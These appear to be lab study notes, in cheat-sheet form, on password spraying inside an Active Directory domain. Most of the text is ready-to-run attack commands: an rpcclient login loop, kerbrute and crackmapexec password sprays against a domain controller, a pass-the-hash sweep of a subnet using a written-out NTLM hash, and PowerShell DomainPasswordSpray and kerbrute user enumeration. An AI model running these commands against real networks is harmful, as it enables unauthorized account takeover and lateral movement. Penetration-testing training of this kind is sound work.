
Linux
---

Internal Spraying

On rpcclient the response Authority Name indicates a successful login
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

We can also use Kerbrute
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

Netexec
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success | grep +
```

Administrator Password Reuse
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

Windows
---

If we are authenticated to the domain we can use the tool DomainPasswordSpray.ps1 ([https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)) to generate a user list.
```

Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```


Kerbrute for Windows
[https://github.com/ropnop/kerbrute/releases/latest](https://github.com/ropnop/kerbrute/releases/latest)
```
kerbrute userenum [username file] --dc [target IP] -d [domain name]
```
